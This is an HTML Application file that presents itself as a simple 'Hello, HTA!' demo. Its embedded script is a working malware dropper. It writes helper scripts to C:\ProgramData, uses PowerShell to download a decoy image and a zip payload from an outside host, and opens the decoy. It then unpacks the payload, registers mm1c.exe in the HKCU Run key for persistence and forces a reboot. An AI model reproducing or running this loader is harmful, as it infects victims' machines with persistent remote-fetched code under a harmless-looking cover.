<!DOCTYPE html>
<html>
<head>
  <title>Hello HTA</title>
  <hta:application
    id="hello"
    applicationname="Hello HTA"
    border="thin"
    contextmenu="no"
    maximizebutton="no"
    minimizebutton="no"
    navigable="yes"
    scroll="no"
    showintaskbar="yes"
    singleinstance="yes"
    sysmenu="yes"
  >
</head>

<script language="javascript">
    // window.resizeTo(0,0);
    var shell = new ActiveXObject('WScript.Shell');
    var ver = ''
    try {
      shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
      ver = 'v4.0.30319'
    }
    catch (e) {
      ver = 'v2.0.50727'
    }
    shell.Environment('Process')('COMPLUS_Version') = ver;
    var p = new ActiveXObject("Scripting.FileSystemObject");
    var s = new ActiveXObject("Scripting.FileSystemObject");
    var x = new ActiveXObject("Scripting.FileSystemObject");
    if (!p.FileExists("C://ProgramData//8292.png")) {
      var o = p.CreateTextFile("C://ProgramData//kohl.js", 2 , true); // 2=true=overwrite, true=unicode
      o.writeline("var shell = new ActiveXObject('WScript.shell');var exec = shell.run('cmd.exe /c powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\8292.png https://cti-1dir.onrender.com/news',0,true);");o.Close();
      shell.run("C://ProgramData//kohl.js", 1);
      // {8292.png and kohl.js in ProgramData}
      var w = p.CreateTextFile("C://ProgramData//kohlw.js", 2, true);
      w.writeline("var shell = new ActiveXObject('WScript.Shell'); WScript.Sleep(10000);var exec = shell.run('cmd.exe /c start C:\\\\ProgramData\\\\8292.png',0,true);");w.Close(); shell.run("C:ProgramData//kohlw.js", 1);
      // {8292.png and kohl.js in ProgramData amd 8292.png is opened}
      var x = p.CreateTextFile("C://ProgramData//kohld.js", 2, true);
      x.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100);var exec = shell.run('cmd.exe /c mkdir C:\\\\ProgramData\\\\dvixm',0,true);");x.Close();shell.run("C://ProgramData//kohld.js", 1);
      // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm' in ProgramData}
      // var shell = new ActiveXObject('WScript.Shell');
      var h = p.CreateTextFile("C://ProgramData//update.js", 2, true);
      h.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(100);var exec = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe /c Invoke-WebRequest -OutFile C:\\\\ProgramData\\\\dvixm\\\\mm1.zip https://cti-1dir.onrender.com/mm1',0 , true);");
      h.writeline("WScript.Sleep(60000);");
      h.writeline("var execUnzip = shell.run('C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -Command \"Expand-Archive -Path C:\\\\ProgramData\\\\dvixm\\\\mm1.zip -DestinationPath C:\\\\ProgramData\\\\dvixm\\\\mm1\"', 0, true);");
      h.Close();shell.run("C://ProgramData//update.js", 1);
      // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm', and mm1.exe in ProgramData }
      
      var ss = s.CreateTextFile("C://ProgramData//parhai.js", 2, true);
      ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(15000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');ss.Close();
      shell.run("C://ProgramData//parhai.js", 1);
      // reboot
      var r = p.CreateTextFile("C://ProgramData//r.js", 2, true);
      r.writeline("var shell = new ActiveXObject('WScript.Shell');WScript.Sleep(200000);var exec = shell.run('cmd.exe /k shutdown /r /f /t 0',0,true);");r.Close();shell.run("C://ProgramData//r.js", 1);
    }
    
</script>


<body>
  <h1>Hello, HTA!</h1>
  <p>This is a simple HTML Applicatiasdon (HTA).</p>
</body>
</html>
